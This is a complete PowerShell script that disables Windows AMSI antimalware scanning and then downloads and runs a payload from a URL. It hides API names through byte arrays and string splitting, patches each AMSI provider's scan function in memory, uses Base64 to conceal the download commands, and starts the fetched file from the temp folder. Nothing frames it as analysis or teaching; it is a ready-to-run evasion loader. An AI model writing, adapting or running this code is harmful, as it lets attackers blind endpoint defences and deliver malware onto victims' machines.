function Invoke-NullAMS1 {
    param
    (
        [Parameter(ParameterSetName = 'Interface',
                   Mandatory = $false,
                   Position = 0)]
        [switch]
        $v,

        [Parameter(ParameterSetName = 'Interface',
                   Mandatory = $false,
                   Position = 0)]
        [switch]
        $etw,

        [Parameter(Mandatory = $false)]
        [string]
        $url
    )

    # If no URL was passed, ask for it
    if (-not $url) {
        $url = Read-Host "Enter the URL of the payload"
    }

    if ($v) {
        $VerbosePreference = "Continue"
    }

    function Get-Function {
        Param(
            [string] $module,
            [string] $function
        )
        $moduleHandle = $GetModule.Invoke($null, @($module))
        $tmpPtr = New-Object IntPtr
        $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $moduleHandle)
        $GetAddres.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $function))
    }

    function Get-Delegate {
        Param (
            [Parameter(Position = 0, Mandatory = $True)] [IntPtr] $funcAddr,
            [Parameter(Position = 1, Mandatory = $True)] [Type[]] $argTypes,
            [Parameter(Position = 2)] [Type] $retType = [Void]
        )
        $type = [AppDomain]::("Curren" + "tDomain").DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('QD')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
        DefineDynamicModule('QM', $false).
        DefineType('QT', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $type.DefineConstructor('RTSpecialName, HideBySig, Public',[System.Reflection.CallingConventions]::Standard, $argTypes).SetImplementationFlags('Runtime, Managed')
        $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $retType, $argTypes).SetImplementationFlags('Runtime, Managed')
        $delegate = $type.CreateType()
        $marshalClass::("GetDelegate" +"ForFunctionPointer")($funcAddr, $delegate)
    }

    Write-host "[*] Patching 4MSI" -ForegroundColor Cyan
    try {
        Add-Type -AssemblyName System.Windows.Forms
    }
    catch {
        Throw "[!] Failed to add WinForms assembly"
    }

    $marshalClass = [System.Runtime.InteropServices.Marshal]
    $unsafeMethodsType = [Windows.Forms.Form].Assembly.GetType('System.Windows.Forms.UnsafeNativeMethods')

    $bytesGetProc = [Byte[]](71, 0, 101, 0, 116, 0, 80, 0, 114, 0, 111, 0, 99, 0, 65, 0, 100, 0, 100, 0, 114, 0, 101, 0, 115, 0, 115, 0)
    $bytesGetMod =  [Byte[]](71, 0, 101, 0, 116, 0, 77, 0, 111, 0, 100, 0, 117, 0, 108, 0, 101, 0, 72, 0, 97, 0, 110, 0, 100, 0, 108, 0, 101, 0)

    $GetProc = [Text.Encoding]::Unicode.GetString($bytesGetProc)
    $GetMod = [Text.Encoding]::Unicode.GetString($bytesGetMod)

    $GetModule = $unsafeMethodsType.GetMethod($GetMod)
    if ($GetModule -eq $null) {
        Throw "[!] Error getting the $GetMod address"
    }

    $GetAddres = $unsafeMethodsType.GetMethod($GetProc)
    if ($GetAddres -eq $null) {
        Throw "[!] Error getting the $GetProc address"
    }

    $bytes4msiInit = [Byte[]](65, 109 , 115, 105, 73, 110, 105, 116, 105, 97, 108, 105, 122, 101)
    $bytes4msi = [Byte[]](97, 109, 115, 105, 46, 100, 108, 108)
    $4msi = [System.Text.Encoding]::ASCII.GetString($bytes4msi)
    $4msiInit = [System.Text.Encoding]::ASCII.GetString($bytes4msiInit)
    
    $4msiAddr = Get-Function $4msi $4msiInit
    if ($4msiAddr -eq $null) {
        Throw "[!] Error getting the $4msiInit address"
    }

    $PtrSize = $marshalClass::SizeOf([Type][IntPtr])
    if ($PtrSize -eq 8) {
        $Initialize = Get-Delegate $4msiAddr @([string], [UInt64].MakeByRefType()) ([Int])
        [Int64]$ctx = 0
    } else {
        $Initialize = Get-Delegate $4msiAddr @([string], [IntPtr].MakeByRefType()) ([Int])
        $ctx = 0
    }

    $replace = 'Virt' + 'ualProtec'
    $name = '{0}{1}' -f $replace, 't'

    $protectAddr = Get-Function ("ker{0}.dll" -f "nel32") $name
    if ($protectAddr -eq $null) {
        Throw "[!] Error getting the $name address"
    }

    $protect = Get-Delegate $protectAddr @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])
    $PAGE_EXECUTE_WRITECOPY = 0x00000080
    $patch = [byte[]] (184, 0, 0, 0, 0, 195)
    $p = 0; $i = 0

    if ($Initialize.Invoke("Scanner", [ref]$ctx) -ne 0) {
        if ($ctx -eq 0) {
            Write-Host "[!] No provider found" -ForegroundColor Red
            return
        } else {
            Throw "[!] Error call $4msiInit"
        }
    }

    if ($PtrSize -eq 8) {
        $CAmsiAntimalware = $marshalClass::ReadInt64([IntPtr]$ctx, 16)
        $AntimalwareProvider = $marshalClass::ReadInt64([IntPtr]$CAmsiAntimalware, 64)
    } else {
        $CAmsiAntimalware = $marshalClass::ReadInt32($ctx+8)
        $AntimalwareProvider = $marshalClass::ReadInt32($CAmsiAntimalware+36)
    }

    while ($AntimalwareProvider -ne 0) {
        if ($PtrSize -eq 8) {
            $AntimalwareProviderVtbl = $marshalClass::ReadInt64([IntPtr]$AntimalwareProvider)
            $AmsiProviderScanFunc = $marshalClass::ReadInt64([IntPtr]$AntimalwareProviderVtbl, 24)
        } else {
            $AntimalwareProviderVtbl = $marshalClass::ReadInt32($AntimalwareProvider)
            $AmsiProviderScanFunc = $marshalClass::ReadInt32($AntimalwareProviderVtbl + 12)
        }

        if (!$protect.Invoke($AmsiProviderScanFunc, [uint32]6, $PAGE_EXECUTE_WRITECOPY, [ref]$p)) {
            Throw "[!] Error changing permissions of provider: $AmsiProviderScanFunc"
        }

        $marshalClass::Copy($patch, 0, [IntPtr]$AmsiProviderScanFunc, 6)

        if (!$protect.Invoke($AmsiProviderScanFunc, [uint32]6, $p, [ref]$p)) {
            Throw "[!] Failed to restore permissions of provider: $AmsiProviderScanFunc"
        }

        $i++
        if ($PtrSize -eq 8) {
            $AntimalwareProvider = $marshalClass::ReadInt64([IntPtr]$CAmsiAntimalware, 64 + ($i*$PtrSize))
        } else {
            $AntimalwareProvider = $marshalClass::ReadInt32($CAmsiAntimalware+36 + ($i*$PtrSize))
        }
    }

    if ($url) {
        Write-Host "[*] Fetching external file..." -ForegroundColor Cyan
        try {
            $iwrBase64 = "SW52b2tlLVdlYlJlcXVlc3Q="
            $ofBase64 = "T3V0LUZpbGU="
            $iwrCmd = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($iwrBase64))
            $ofCmd = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($ofBase64))
            $tempFile = [IO.Path]::Combine($env:TEMP, ('dl_' + (Get-Random) + '.bin'))
            &($iwrCmd) -Uri $url -UseBasicParsing | &($ofCmd) -FilePath $tempFile -Force
            Write-Host "[+] File saved to $tempFile" -ForegroundColor Green
            Start-Process -FilePath $tempFile
        } catch {
            Write-Host "[!] Failed to fetch file from $url" -ForegroundColor Red
        }
    }

    Write-Host "[*] AMSI patched successfully" -ForegroundColor Green
}

# Prompt the user for the URL when script runs
$urlInput = Read-Host "Enter the URL of the payload"
Invoke-NullAMS1 -url $urlInput
